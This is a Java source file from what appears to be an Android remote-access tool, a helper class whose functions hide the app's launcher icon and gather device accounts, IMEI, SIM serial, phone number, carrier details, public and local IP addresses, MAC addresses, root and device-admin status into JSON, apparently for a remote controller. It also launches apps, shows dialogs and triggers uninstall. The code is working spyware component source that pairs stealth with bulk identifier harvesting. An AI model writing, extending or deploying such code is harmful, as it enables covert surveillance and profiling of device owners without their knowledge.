package com.remote.app;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.provider.Settings;
import android.support.annotation.RequiresApi;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;

public class function {

    public static void hideAppIcon(Context context) {
        PackageManager p = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    public static void unHideAppIcon(Context context) {
        PackageManager p = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }



    public static void Delete(Context context){
        Uri packageURI = Uri.parse("package:"+MainActivity.class.getPackage().getName());
        Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
        context.startActivity(uninstallIntent);

    }

    public static void OpenDialog(Context context,String title, String message){


        Intent intent = new Intent(context.getApplicationContext(), Dialog.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("Title", title);
        intent.putExtra("Message", message);
        context.startActivity(intent);
    }




    public static JSONObject getUserAccounts(Context context){
        try{
            JSONObject Acs = new JSONObject();
            JSONArray list = new JSONArray();

            AccountManager am = AccountManager.get(context.getApplicationContext());

            Account[] accounts = am.getAccounts();
            int i = 0;
            for (Account ac : accounts) {
                if(i<10)
                {
                    JSONObject act = new JSONObject();
                    String acname = ac.name;
                    String actype = ac.type;
                    act.put("Aname",acname);
                    act.put("Atype",actype);
                    list.put(act);
                }
                i++;
            }
            Acs.put("accountsList", list);
            return Acs;
        }catch (Exception e){}
        return null;
    }

    @SuppressLint("MissingPermission")
    public static JSONObject GetInfo(Context context){
        JSONObject info = new JSONObject();
        JSONArray array = new JSONArray();
        //JSONArray array = new JSONArray();
        try {

            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            AudioManager audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                info.put("IMEI", tm.getImei());
            }

            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
            info.put("DeviceID", deviceID);
            info.put("SoftwareVersion",tm.getDeviceSoftwareVersion());
            //Phone info
            info.put("CountryCode",tm.getNetworkCountryIso());
            info.put("OperatorName",tm.getNetworkOperatorName());
            info.put("OperatorCode",tm.getNetworkOperator());

            info.put("SimCountryCode",tm.getSimCountryIso());
            info.put("SimOperatorName",tm.getSimOperatorName());
            info.put("SimOperatorCode",tm.getSimOperator());
            info.put("SimSerial",tm.getSimSerialNumber());

            info.put("PhoneNumber",tm.getLine1Number());

            //audio
            info.put("AudioMode",audioManager.getMode());
            info.put("AudioRingerMode",audioManager.getRingerMode());
            //network

            try (java.util.Scanner s = new java.util.Scanner(new java.net.URL("https://api.ipify.org").openStream(), "UTF-8").useDelimiter("\\A")) {
                info.put("IPAddress",s.next() );
            } catch (java.io.IOException e) {
                e.printStackTrace();
            }
            info.put("LOIPAddress",getIPAddress(true));

            WifiManager wm = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            String ip = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());

            info.put("WIPAddress",ip );
            info.put("MACAddressETH0", getMACAddress("eth0"));
            info.put("MACAddressWLAN0", getMACAddress("wlan0"));

            info.put("Root",ExecuteAsRootBase.canRunRootCommands());

            PackageManager p = context.getPackageManager();
            ComponentName componentName = new ComponentName(context, MainActivity.class);

            info.put("hideApp",p.getComponentEnabledSetting(componentName));//2-enabled hide 0- disabled hide

            info.put("admin",MainService.isAdmin());


            array.put(info);
            info = new JSONObject();
            info.put("info",array);


            //info.put("hideApp", )



            return info;

        }catch (Exception e){return null;}



    }


    public static String getLocalIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) {
                        String ip = Formatter.formatIpAddress(inetAddress.hashCode());
                        Log.i("mylogs", "***** IP="+ ip);
                        return ip;
                    }
                }
            }
        } catch (SocketException ex) {
            Log.e("mylogs", ex.toString());
        }
        return null;
    }

    public static String getIPAddress(boolean useIPv4) {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress()) {
                        String sAddr = addr.getHostAddress();
                        //boolean isIPv4 = InetAddressUtils.isIPv4Address(sAddr);
                        boolean isIPv4 = sAddr.indexOf(':')<0;

                        if (useIPv4) {
                            if (isIPv4)
                                return sAddr;
                        } else {
                            if (!isIPv4) {
                                int delim = sAddr.indexOf('%'); // drop ip6 zone suffix
                                return delim<0 ? sAddr.toUpperCase() : sAddr.substring(0, delim).toUpperCase();
                            }
                        }
                    }
                }
            }
        } catch (Exception ignored) { } // for now eat exceptions
        return "";
    }

    public static String getMACAddress(String interfaceName) {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                if (interfaceName != null) {
                    if (!intf.getName().equalsIgnoreCase(interfaceName)) continue;
                }
                byte[] mac = intf.getHardwareAddress();
                if (mac==null) return "";
                StringBuilder buf = new StringBuilder();
                for (byte aMac : mac) buf.append(String.format("%02X:",aMac));
                if (buf.length()>0) buf.deleteCharAt(buf.length()-1);
                return buf.toString();
            }
        } catch (Exception ignored) { } // for now eat exceptions
        return "";
        /*try {
            // this is so Linux hack
            return loadFileAsString("/sys/class/net/" +interfaceName + "/address").toUpperCase().trim();
        } catch (IOException ex) {
            return null;
        }*/
    }


    public static void ToastShow(Context context,String text){
        Toast.makeText(context,text,Toast.LENGTH_LONG).show();
    }

    public static void OpenApp(Context context,String packageN){
        final PackageManager packageManager = context.getApplicationContext().getPackageManager();
        List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
        for (ApplicationInfo appInfo : installedApplications)
        {
            if(appInfo.packageName.equals(packageN))
            {
                Intent k = new Intent();
                PackageManager manager = context.getPackageManager();
                k = manager.getLaunchIntentForPackage(packageN);
                k.addCategory(Intent.CATEGORY_LAUNCHER);
                context.startActivity(k);
            }
        }
    }


}
